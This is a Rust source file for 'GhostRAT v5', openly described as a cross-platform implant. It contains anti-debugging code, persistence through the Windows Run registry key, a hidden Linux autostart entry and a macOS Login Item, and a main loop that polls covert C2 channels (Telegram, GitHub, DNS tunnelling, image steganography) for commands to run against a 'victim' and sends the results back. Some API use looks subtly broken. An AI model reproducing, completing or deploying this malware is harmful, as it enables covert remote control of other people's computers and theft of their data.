//! GhostRAT v5 — entry point, CLI parsing, config loading, main loop.

mod c2;
mod config;
mod crypto;
mod gpu;
mod modules;
mod spsc_ringbuf;
mod utils;

use anyhow::{Context, Result};
use clap::Parser;
use config::Config;
use c2::{C2Channel, C2Dispatcher};
use modules::ModuleRegistry;
use spsc_ringbuf::RingBuffer;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;
use tokio::sync::mpsc;
use tracing::{error, info, warn};

/// GhostRAT v5 — cross-platform native implant with GPU compute shaders
#[derive(Parser, Debug)]
#[command(name = "ghost", version = "5.0.0", about = "GhostRAT v5 implant")]
struct Cli {
    /// Path to JSON config file
    #[arg(long)]
    config: Option<String>,

    /// C2 channel to use (telegram, github-issues, github-api, wifi-beacon, ble-adv, dns-tunnel, png-stego, all)
    #[arg(long, default_value = "all")]
    channel: String,

    /// Telegram bot token
    #[arg(long, value_name = "TOKEN")]
    token: Option<String>,

    /// Telegram chat ID
    #[arg(long, value_name = "ID")]
    chat_id: Option<i64>,

    /// GitHub repo (owner/name)
    #[arg(long, value_name = "OWNER/NAME")]
    repo: Option<String>,

    /// GitHub PAT
    #[arg(long, value_name = "PAT")]
    github_token: Option<String>,

    /// Victim ID override
    #[arg(long, value_name = "ID")]
    victim_id: Option<String>,

    /// Run in demo mode (no real C2, prints commands)
    #[arg(long)]
    demo: bool,

    /// Heartbeat interval in seconds
    #[arg(long, default_value_t = 60)]
    heartbeat_interval: u64,

    /// Enable GPU compute shader execution
    #[arg(long)]
    gpu: bool,

    /// Disable GPU (force CPU fallback)
    #[arg(long)]
    no_gpu: bool,
}

/// Check if a debugger is present
fn is_debugged() -> bool {
    #[cfg(windows)]
    {
        use windows::Win32::Foundation;
        use windows::Win32::System::Diagnostics::Debug;
        unsafe {
            let handle = Foundation::GetCurrentProcess();
            let result = Debug::IsDebuggerPresent();
            result.as_bool()
        }
    }
    #[cfg(unix)]
    {
        // Simple timing-based anti-debug for Unix
        // Check if process is being traced via ptrace
        let pid = std::process::id();
        let status_path = format!("/proc/{}/status", pid);
        std::fs::read_to_string(&status_path)
            .map(|content| content.contains("TracerPid:\t"))
            .unwrap_or(false)
    }
}

/// Setup persistence for the current platform
fn setup_persistence(config: &Config) {
    if !config.persistence {
        return;
    }

    let exe_path = std::env::current_exe().ok();
    let Some(exe) = exe_path else {
        warn!("Cannot determine executable path for persistence");
        return;
    };

    #[cfg(windows)]
    {
        use windows::Win32::Foundation;
        use windows::Win32::Storage::FileSystem;
        use windows::Win32::System::Registry;
        use windows::core::PWSTR;

        let key_path = r"Software\Microsoft\Windows\CurrentVersion\Run";
        let value_name = "GhostRAT";
        let value_data = format!("\"{}\" --channel all", exe.display());

        unsafe {
            let mut handle = Foundation::HANDLE::default();
            let result = Registry::RegOpenKeyExW(
                Foundation::HKEY_CURRENT_USER,
                PWSTR(key_path.as_ptr() as *mut u16),
                0,
                Registry::KEY_SET_VALUE,
                &mut handle,
            );
            if result.is_ok() {
                let data_bytes: Vec<u16> = value_data.encode_utf16().chain(Some(0)).collect();
                let result = Registry::RegSetValueExW(
                    handle,
                    PWSTR(value_name.as_ptr() as *mut u16),
                    0,
                    Registry::REG_SZ,
                    data_bytes.as_ptr() as *const u8,
                    (data_bytes.len() * 2) as u32,
                );
                if result.is_ok() {
                    info!("Windows persistence: set HKCU Run key");
                } else {
                    warn!("Windows persistence: failed to set Run key");
                }
                Registry::RegCloseKey(handle).ok();
            } else {
                warn!("Windows persistence: cannot open registry key");
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        if let Some(config_dir) = dirs::config_dir() {
            let autostart_dir = config_dir.join("autostart");
            if let Ok(_) = std::fs::create_dir_all(&autostart_dir) {
                let desktop_file = autostart_dir.join("ghostrat.desktop");
                let content = format!(
                    "[Desktop Entry]\nName=GhostRAT\nExec={}\nHidden=false\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\n",
                    exe.display()
                );
                if std::fs::write(&desktop_file, content).is_ok() {
                    info!("Linux persistence: created autostart desktop entry");
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        if let Some(app_support) = dirs::config_dir() {
            let login_items = app_support.join("Application Support").join("LoginItems");
            let item_dir = login_items.join("GhostRAT.app");
            if let Ok(_) = std::fs::create_dir_all(&item_dir) {
                let plist = item_dir.join("Contents").join("Info.plist");
                if let Ok(_) = std::fs::create_dir_all(plist.parent().unwrap()) {
                    let content = format!(
                        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>CFBundleExecutable</key>\n<string>{}</string>\n</dict>\n</plist>\n",
                        exe.file_name().unwrap().to_string_lossy()
                    );
                    if std::fs::write(&plist, content).is_ok() {
                        info!("macOS persistence: created Login Item");
                    }
                }
            }
        }
    }
}

/// Send a heartbeat via all available channels
async fn send_heartbeat(victim_id: &str, dispatcher: &C2Dispatcher) {
    let heartbeat = serde_json::json!({
        "type": "heartbeat",
        "victim_id": victim_id,
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "status": "alive"
    });

    let payload = heartbeat.to_string().into_bytes();
    let encrypted = crypto::xor_encrypt(&payload, "GHOSTRATV5");

    if let Err(e) = dispatcher.send_all(victim_id, &encrypted).await {
        error!("Heartbeat send failed: {}", e);
    }
}

/// Execute a command using the module registry
async fn execute_command(
    cmd: &c2::Command,
    victim_id: &str,
    modules: &ModuleRegistry,
    dispatcher: &C2Dispatcher,
    gpu_enabled: bool,
) {
    info!("Executing command 0x{:02X} on {}", cmd.cmd_type, cmd.cmd_type_name());

    let result = modules.execute(cmd, gpu_enabled).await;

    match result {
        Ok(output) => {
            let encrypted = crypto::xor_encrypt(&output, &cmd.crypto_key);
            if let Err(e) = dispatcher.send_all(victim_id, &encrypted).await {
                error!("Failed to send result for cmd 0x{:02X}: {}", cmd.cmd_type, e);
            }
        }
        Err(e) => {
            error!("Module execution failed for cmd 0x{:02X}: {}", cmd.cmd_type, e);
            let error_payload = format!("ERROR: {}", e).into_bytes();
            let encrypted = crypto::xor_encrypt(&error_payload, &cmd.crypto_key);
            let _ = dispatcher.send_all(victim_id, &encrypted).await;
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize tracing
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .init();

    let cli = Cli::parse();

    info!(
        "GhostRAT v5 starting — channel={}, demo={}, gpu={}",
        cli.channel, cli.demo, cli.gpu
    );

    // Anti-debug check
    if is_debugged() {
        info!("Debugger detected, exiting");
        return Ok(());
    }

    // Load config
    let config = Config::load(&cli).context("Failed to load configuration")?;
    info!("Config loaded: victim_id={}", config.victim_id);

    // Persistence
    if config.persistence {
        setup_persistence(&config);
    }

    // Initialize C2 dispatcher
    let dispatcher = C2Dispatcher::new(&config, &cli).await?;
    let channels = dispatcher.active_channels();
    info!(
        "Active C2 channels: {}",
        channels.iter().map(|c| c.name()).collect::<Vec<_>>().join(", ")
    );

    // Initialize module registry
    let modules = ModuleRegistry::new();

    // GPU flag
    let gpu_enabled = cli.gpu || (!cli.no_gpu && cfg!(feature = "gpu-webgpu"));
    if gpu_enabled {
        info!("GPU compute shader execution enabled");
        if let Err(e) = gpu::init() {
            warn!("GPU init failed, falling back to CPU: {}", e);
        }
    } else {
        info!("GPU compute shader execution disabled, using CPU fallback");
    }

    // Command ring buffer for async processing
    let (cmd_tx, mut cmd_rx) = mpsc::channel::<(c2::Command, String)>(128);
    let _ring = RingBuffer::new(256); // SPSC ring buffer for command sync

    // Spawn command executor task
    let dispatcher_clone = dispatcher.clone();
    let modules_clone = modules.clone();
    let victim_id_clone = config.victim_id.clone();
    let gpu_flag = gpu_enabled;
    tokio::spawn(async move {
        while let Some((cmd, vid)) = cmd_rx.recv().await {
            execute_command(&cmd, &vid, &modules_clone, &dispatcher_clone, gpu_flag).await;
        }
    });

    // Main loop
    let heartbeat_interval = Duration::from_secs(config.heartbeat_interval);
    let poll_interval = Duration::from_secs(config.heartbeat_interval / 4); // Poll more frequently than heartbeat

    info!("Starting main loop (heartbeat={}s, poll={}s)",
        config.heartbeat_interval,
        config.heartbeat_interval / 4);

    loop {
        // Poll all active channels
        for channel in dispatcher.active_channels() {
            if !channel.is_available() {
                continue;
            }

            match channel.poll_commands().await {
                Ok(commands) => {
                    for cmd in commands {
                        let vid = cmd.victim_id.clone();
                        if let Err(e) = cmd_tx.send((cmd, vid)).await {
                            error!("Failed to enqueue command: {}", e);
                        }
                    }
                }
                Err(e) => {
                    warn!("C2 poll error on {}: {}", channel.name(), e);
                }
            }
        }

        // Send heartbeat
        if let Err(e) = send_heartbeat(&config.victim_id, &dispatcher).await {
            warn!("Heartbeat failed: {}", e);
        }

        tokio::time::sleep(poll_interval).await;
    }
}
